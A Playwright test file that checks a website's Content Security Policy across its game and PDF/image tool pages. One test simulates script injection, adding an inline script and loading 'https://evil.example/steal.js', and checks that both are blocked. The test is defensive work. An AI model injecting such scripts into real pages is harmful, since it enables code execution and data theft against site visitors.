import { test, expect, takeCspViolations } from './fixtures.mjs';

// Every page carries a content security policy (written by scripts/build.mjs
// from scripts/parts.mjs). The fixture fails any test in which the policy
// blocks something, so every other spec checks the policy lets the site work.
const pages = ['/', '/profile/', '/falling-blocks/', '/maze-chase/', '/flap/', '/road-hop/', '/snake/', '/brick-bounce/', '/chess/', '/merge-pdf/', '/watermark-pdf/', '/redact-pdf/', '/sign-pdf/', '/unlock-pdf/', '/mp4-to-mp3/', '/compress-image/', '/photo-collage/', '/fit-to-frame/'];

test('every page sets its policy before it loads anything', async ({ page }) => {
  for (const url of pages) {
    await page.goto(url);
    const head = await page.locator('head > *').evaluateAll((els) => els.map((e) => ({
      tag: e.tagName, csp: e.getAttribute('http-equiv') === 'Content-Security-Policy', data: e.type === 'application/ld+json'
    })));
    const at = head.findIndex((h) => h.csp);
    expect(at, url).toBeGreaterThan(-1);
    const first = head.findIndex((h) => (h.tag === 'LINK' || h.tag === 'SCRIPT') && !h.data);
    expect(at, url).toBeLessThan(first);
    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(policy, url).toContain("default-src 'self'");
    expect(policy, url).toContain("object-src 'none'");
    expect(policy, url).not.toContain("'unsafe-inline'");
    expect(policy, url).not.toContain("'unsafe-eval'");
  }
});

test('scripts injected into a page don\'t run, and scripts from elsewhere don\'t load', async ({ page }) => {
  await page.goto('/merge-pdf/');
  const ran = await page.evaluate(() => new Promise((resolve) => {
    const inline = document.createElement('script');
    inline.textContent = 'window.injected = true';
    document.head.appendChild(inline);
    const remote = document.createElement('script');
    remote.src = 'https://evil.example/steal.js';
    remote.onerror = () => resolve({ inline: !!window.injected, remote: 'blocked' });
    remote.onload = () => resolve({ inline: !!window.injected, remote: 'loaded' });
    document.head.appendChild(remote);
  }));
  expect(ran).toEqual({ inline: false, remote: 'blocked' });
  const blocked = takeCspViolations(page);
  expect(blocked.some((m) => /inline script/i.test(m))).toBe(true);
  expect(blocked.some((m) => m.includes('https://evil.example/steal.js'))).toBe(true);
});
